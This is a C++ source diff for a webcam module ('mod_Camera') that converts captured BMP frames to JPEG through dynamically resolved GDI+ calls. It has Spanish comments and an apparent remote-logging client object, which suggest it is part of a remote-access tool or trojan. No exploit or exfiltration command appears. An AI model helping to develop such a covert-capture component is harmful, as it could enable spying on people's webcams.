@@ -15,15 +15,19 @@ int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     UINT  num = 0;          // number of image encoders
     UINT  size = 0;         // size of the image encoder array in bytes
 
-    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+    ImageCodecInfo* pImageCodecInfo = NULL;
 
     this->GDIPLUS.pGetImageEncodersSize(&num, &size);
-    if (size == 0)
+    if (size == 0) {
+        __DBG_("[X]GetEncoderClsid error");
         return -1;  // Failure
+    }
 
-    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
-    if (pImageCodecInfo == NULL)
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) {
+        __DBG_("[X]GetEncoderClsid error");
         return -1;  // Failure
+    }
 
     this->GDIPLUS.pGetImageEncoders(num, size, pImageCodecInfo);
 
@@ -38,6 +42,7 @@ int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     }
 
     free(pImageCodecInfo);
+    __DBG_("[X]GetEncoderClsid error");
     return -1;  // Failure
 }
 
@@ -82,19 +87,19 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     std::vector<BYTE> bJPEGbuffer;
 
     if (!this->GDIPLUS.pGdiplusStartup || !this->KERNEL32.pGlobalAlloc || !this->SHLWAPI.pSHCreateMemStream ||
-        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pFromStream || !this->GDIPLUS.pGdiplusShutdown ||
+        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pGdiplusShutdown ||
         !this->KERNEL32.pGlobalFree) {
         __DBG_("[X]toJPEG error");
         return bJPEGbuffer;
     }
     HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
-    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     this->GDIPLUS.pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    Gdiplus::Image* nImage = nullptr;
-    Gdiplus::Status  stat;
+    GpBitmap *nImage = nullptr;
+    GpStatus  statRet;
     STATSTG statstg;
     IStream* oStream;
     IStream* nStream;
@@ -120,15 +125,18 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     }
 
     nStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
-
-    nImage = this->GDIPLUS.pFromStream(nStream, FALSE);
-    if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
-        __DBG_("[X] Gdiplus::Image::FromStream error");
-        cCliente->m_RemoteLog("[WEBCAM] Gdiplus::Image::FromStream error : " + std::to_string(GetLastError()));
+    
+    //Crear bitmap a partir de bmpBuffer
+    //GdipCreateBitmapFromStream
+    statRet = this->GDIPLUS.pGdipCreateBitmapFromStream(nStream, &nImage);
+    //nImage = this->GDIPLUS.pFromStream(nStream, FALSE);
+    if (nImage == nullptr || statRet != GpStatus::Ok) {
+        __DBG_("[X] pGdipCreateBitmapFromStream error");
+        cCliente->m_RemoteLog("[WEBCAM] pGdipCreateBitmapFromStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
-    
+    //Seleccionar encoder jpg para luego guardar el buffer en otro stream
     iRet = this->GetEncoderClsid(L"image/jpeg", &encoderClsid);
     if (iRet == -1) {
         __DBG_("[X] image/jpeg not found trying PNG...");
@@ -139,10 +147,10 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
         }
     }
 
-    //stat = nImage->Save(oStream, &encoderClsid, NULL);
-    stat = this->GDIPLUS.pGdipSaveImageToStream(nImage, oStream, &encoderClsid, NULL);
-    if (stat != Gdiplus::Ok) {
-        __DBG_("[X] nImage->Save");
+    //Guardar el bitmap en un nuevo stream con la conversion a jpg
+    statRet = this->GDIPLUS.pGdipSaveImageToStream(nImage, oStream, &encoderClsid, NULL);
+    if (statRet != GpStatus::Ok) {
+        __DBG_("[X] pGdipSaveImageToStream");
         goto release;
     }
 
@@ -158,11 +166,11 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
 
+    //Obtener bytes jpg de la imagen final
     hr = oStream->Read(bJPEGbuffer.data(), uiBuffS, &bytesRead);
     if (hr != S_OK) {
         __DBG_("[X] oStream->Read");
     }
-
 
     release:
 
